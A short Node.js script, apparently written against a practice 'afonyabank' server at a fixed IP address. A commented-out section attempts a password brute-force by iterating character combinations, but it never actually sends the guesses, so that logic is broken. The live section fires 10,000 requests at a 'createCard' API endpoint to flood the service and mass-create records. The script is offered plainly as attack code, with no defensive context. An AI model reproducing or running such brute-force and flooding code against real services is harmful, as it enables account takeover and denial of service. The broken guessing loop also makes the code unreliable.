let fetch = require("node-fetch")
/*let bet = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"

async function macska() {
    let maho = 8

    for (let aho = 0; aho < maho; aho++){
        let julszancs = []
        for (let ik = 0; ik<aho; ik++){
            julszancs.push(bet[0])
        }

        for (let i=aho; i>=0; i--) {
            for (let k in bet) {
                julszancs[i] = bet[k]
                let recsk = ""
                for (let mi=0; mi<julszancs.length; mi++) {
                    recsk = recsk+julszancs[mi]
                }
                let resa = await fetch("http://25.90.50.187:1013/afonyabank/index.jsx")
                let ret = await resa.text()

                if (ret != "err_user_not_exists_or_passwords_not_match") {
                    console.log("PASS FOUND :: "+recsk+" :: SERES :: "+ret)
                } else {
                    console.log("PASS ERR NOT GOOD :: "+recsk+" ("+ret+")")
                }
            }
        }
    }
}
macska()

*/

async function a() {
  for (var i = 0; i < 10000; i++) {
    try {
      await fetch("http://25.90.50.187:1042/api?mode=createCard&ip=127.0.0.1")

    }catch(e) {
      console.log(e);
    }

  }
}
a()
